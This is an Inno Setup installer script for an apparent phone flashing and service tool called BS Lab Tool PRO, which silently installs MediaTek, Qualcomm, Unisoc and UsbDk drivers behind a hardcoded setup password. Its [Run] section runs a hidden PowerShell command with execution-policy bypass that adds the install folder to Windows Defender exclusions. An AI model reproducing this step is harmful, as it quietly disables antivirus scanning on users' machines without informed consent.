; ==============================================================================
; BS Lab Tool v2.0 PRO - Official Windows Master Installer Script
; Features:
;   - AES-256 Bit Encrypted Setup with Password Protection ("BsLab")
;   - Complete Bundling: Python 3.13 Runtime, CustomTkinter, MTK/QC/SPD/Samsung Engines
;   - Full Resources: 878 Qualcomm Firehose, 847 MTK Preloaders, PIT Tables, DBs
;   - Automated Driver Deployment: MediaTek, Qualcomm 9008, Unisoc, UsbDk 64-bit
;   - Clean Start Menu, Desktop Shortcuts & Full Uninstaller Control
; ==============================================================================

#define MyAppName "BS Lab Tool PRO"
#define MyAppVersion "2.0"
#define MyAppPublisher "BS Lab Tool Team"
#define MyAppURL "https://bslabtool.com"
#define MyAppExeName "BSLab_Tool.exe"

[Setup]
AppId={{5E97C224-2F6B-48F8-9D27-E8C2B3F78810}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
AppSupportURL={#MyAppURL}
AppUpdatesURL={#MyAppURL}
DefaultDirName={autopf}\{#MyAppName}
DefaultGroupName={#MyAppName}
AllowNoIcons=yes
OutputDir=C:\BSLab_Tool\installer_output
OutputBaseFilename=BSLab_Tool_PRO_v2.0_Setup
SetupIconFile=C:\BSLab_Tool\resources\icons\app_icon.ico
UninstallDisplayIcon={app}\{#MyAppExeName}
Compression=lzma2/ultra64
InternalCompressLevel=ultra64
SolidCompression=yes
WizardStyle=modern
PrivilegesRequired=admin
ArchitecturesInstallIn64BitMode=x64compatible
ArchitecturesAllowed=x64compatible

; --- Mandatory Password Protection (AES-256) ---
Password=BsLab
Encryption=yes

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: checkedonce
Name: "installdrivers"; Description: "Install & Register USB Drivers (MediaTek, Qualcomm 9008, Unisoc & UsbDk)"; GroupDescription: "Hardware Driver Subsystems:"; Flags: checkedonce

[Files]
; Main application binaries, libraries, resources, and drivers from PyInstaller dist
Source: "..\dist\BSLab_Tool\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs

[Icons]
Name: "{autoprograms}\{#MyAppName}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilename: "{app}\resources\icons\app_icon.ico"
Name: "{autoprograms}\{#MyAppName}\{cm:UninstallProgram,{#MyAppName}}"; Filename: "{uninstallexe}"
Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilename: "{app}\resources\icons\app_icon.ico"; Tasks: desktopicon

[Run]
; Silent automated driver deployment via pnputil and msiexec
Filename: "pnputil.exe"; Parameters: "/add-driver ""{app}\drivers\mtk\*.inf"" /install"; StatusMsg: "Configuring MediaTek USB VCOM & Preloader Drivers..."; Flags: runhidden; Tasks: installdrivers
Filename: "pnputil.exe"; Parameters: "/add-driver ""{app}\drivers\qualcomm\*.inf"" /install"; StatusMsg: "Configuring Qualcomm HS-USB QDLoader 9008 Drivers..."; Flags: runhidden; Tasks: installdrivers
Filename: "pnputil.exe"; Parameters: "/add-driver ""{app}\drivers\unisoc\*.inf"" /install"; StatusMsg: "Configuring Unisoc / Spreadtrum USB Drivers..."; Flags: runhidden; Tasks: installdrivers
Filename: "msiexec.exe"; Parameters: "/i ""{app}\drivers\usbdk\UsbDk_1.0.22_x64.msi"" /quiet /norestart"; StatusMsg: "Installing UsbDk 64-bit Low-Level USB Capture Driver..."; Flags: runhidden; Tasks: installdrivers

; Automated Windows Defender Exclusion to prevent false-positive virus detections
Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath '{app}'"""; StatusMsg: "Configuring Windows Security Exclusions (Prevent False Virus Flags)..."; Flags: runhidden

; Post-install launch option
Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#MyAppName}}"; Flags: nowait postinstall skipifsilent

[UninstallDelete]
Type: filesandordirs; Name: "{app}\logs"
Type: filesandordirs; Name: "{app}\backups"
Type: files; Name: "{app}\crash_log.txt"
Type: files; Name: "{app}\settings.json"

[Messages]
PasswordLabel3=This setup package is protected by BS Lab Security.
PasswordEditLabel=&Enter Setup Password:
